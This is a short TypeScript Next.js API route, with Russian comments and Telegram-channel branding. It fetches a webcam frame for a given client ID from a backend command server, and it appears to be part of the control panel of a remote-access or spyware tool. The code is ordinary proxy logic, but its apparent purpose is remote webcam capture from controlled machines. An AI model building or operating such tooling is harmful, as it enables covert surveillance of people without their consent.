// t.me/SentinelLinks

// t.me/SentinelLinks
import { NextResponse } from "next/server"

// Webcam API - запрашивает кадр веб-камеры через главный сервер
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const clientId = searchParams.get("clientId")
  const cameraId = searchParams.get("cameraId") || "0"

  if (!clientId) {
    return NextResponse.json({ error: "Client ID required" }, { status: 400 })
  }

  try {
    // Получаем конфигурацию сервера
    const serverUrl = process.env.WS_SERVER_URL || "http://localhost:8765"

    const response = await fetch(`${serverUrl}/api/webcam/${clientId}?camera=${cameraId}`, {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    })

// t.me/SentinelLinks
    if (!response.ok) {
      return NextResponse.json({ error: "Failed to get webcam frame" }, { status: 500 })
    }

    const data = await response.json()
    return NextResponse.json(data)
  } catch (error) {
    console.error("[API] Webcam error:", error)
    return NextResponse.json({ error: "Webcam request failed" }, { status: 500 })
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
